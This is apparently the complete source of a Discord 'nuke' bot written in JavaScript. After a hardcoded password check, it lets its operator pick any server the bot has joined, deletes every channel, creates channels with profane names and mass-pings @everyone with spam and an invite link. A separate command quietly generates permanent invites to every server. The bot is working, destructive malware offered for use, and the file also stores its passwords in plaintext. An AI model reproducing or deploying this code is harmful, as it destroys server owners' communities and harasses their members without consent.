const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim().toLowerCase();

  // !check (existing)
  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server → Raid or Nuke')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    return message.reply({ embeds: [embed], components: [row] });
  }

  // NEW !inv COMMAND
  if (content === '!inv') {
    const guilds = Array.from(client.guilds.cache.values());
    if (guilds.length === 0) {
      return message.reply('❌ Bot is not in any servers.');
    }

    const embed = new EmbedBuilder()
      .setColor('#00ffff')
      .setTitle('📋 Bot Servers & Invites')
      .setDescription('Here are the servers the bot is in:');

    for (const guild of guilds) {
      try {
        const invite = await guild.invites.create(guild.systemChannelId || guild.channels.cache.filter(c => c.type === 0).first()?.id, { maxAge: 0, maxUses: 0 })
          .catch(() => null);

        embed.addFields({
          name: guild.name,
          value: `**Members:** ${guild.memberCount}\n**Invite:** ${invite ? invite.url : 'No invite created (need permission)'}`,
          inline: false
        });
      } catch (e) {
        embed.addFields({
          name: guild.name,
          value: `**Members:** ${guild.memberCount}\n**Invite:** Failed to create`,
          inline: false
        });
      }
    }

    await message.reply({ embeds: [embed] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
    }

    if (action !== 'check') return;

    // ... (password, server select, action select - same as before) ...
    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`check_modal_${interaction.user.id}`)
        .setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
      ));
      return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
      }

      const guilds = Array.from(client.guilds.cache.values());
      if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is in no servers.', flags: MessageFlags.Ephemeral });

      const options = guilds.map(g => ({
        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
        value: g.id,
        description: `${g.memberCount} members`
      }));

      const select = new StringSelectMenuBuilder()
        .setCustomId(`check_server_select_${interaction.user.id}`)
        .setPlaceholder('Select server')
        .addOptions(options);

      await interaction.reply({
        content: '✅ Password accepted. Select server:',
        components: [new ActionRowBuilder().addComponents(select)],
        flags: MessageFlags.Ephemeral
      });
      userSessions.set(interaction.user.id, {});
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
      await interaction.deferUpdate();
      const guildId = interaction.values[0];
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      userSessions.set(interaction.user.id, { guildId });

      const actionSelect = new StringSelectMenuBuilder()
        .setCustomId(`check_action_select_${interaction.user.id}`)
        .setPlaceholder('Choose action')
        .addOptions([
          { label: '🔥 Raid', value: 'raid' },
          { label: '☢️ Nuke', value: 'nuke' }
        ]);

      await interaction.editReply({
        content: `**Selected:** ${guild.name} (${guild.memberCount} members)\nChoose action:`,
        components: [new ActionRowBuilder().addComponents(actionSelect)]
      });
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
      if (interaction.values[0] === 'nuke') {
        const modal = new ModalBuilder()
          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
          .setTitle('Confirm Nuke');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
        ));
        return await interaction.showModal(modal);
      }
    }

    // ==================== IMPROVED NUKE ====================
    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== NUKE_PASSWORD) {
        return interaction.reply({ content: '❌ Wrong nuke password.', flags: MessageFlags.Ephemeral });
      }

      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      const session = userSessions.get(interaction.user.id);
      const guild = client.guilds.cache.get(session?.guildId);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      await interaction.editReply({ content: `☢️ Starting nuke on **${guild.name}**...` });

      const delay = ms => new Promise(r => setTimeout(r, ms));
      const invite = 'https://discord.gg/NANQMy3WnD';

      try {
        // Delete channels
        await interaction.editReply({ content: '🗑️ Deleting all channels...' });
        for (const channel of guild.channels.cache.values()) {
          await channel.delete().catch(() => {});
          await delay(700);
        }

        // Create channels
        await interaction.editReply({ content: '🔨 Creating fucked-by-fame channels...' });
        const created = [];

        for (let i = 0; i < 12; i++) {   // Reduced + safe delay
          try {
            const chan = await guild.channels.create({
              name: 'fucked-by-fame',
              type: 0,
              reason: 'Nuke by Fame'
            });
            created.push(chan);
            await delay(1500); // Increased for stability
          } catch (e) {
            console.error("Channel creation stopped:", e.message);
            break;
          }
        }

        // Spam
        await interaction.editReply({ content: `💥 Spamming in ${created.length} channels...` });
        const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;

        for (const channel of created) {
          for (let i = 0; i < 8; i++) {
            channel.send(spam).catch(() => {});
            if (i % 3 === 0) await delay(700);
          }
        }

        await interaction.editReply({ 
          content: `✅ **NUKE COMPLETE**\n• Created **${created.length}** \`fucked-by-fame\` channels\n• Spammed @everyone + invite` 
        });

      } catch (err) {
        console.error(err);
        await interaction.editReply({ content: '⚠️ Nuke stopped (rate limits or permissions).' });
      }

      userSessions.delete(interaction.user.id);
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
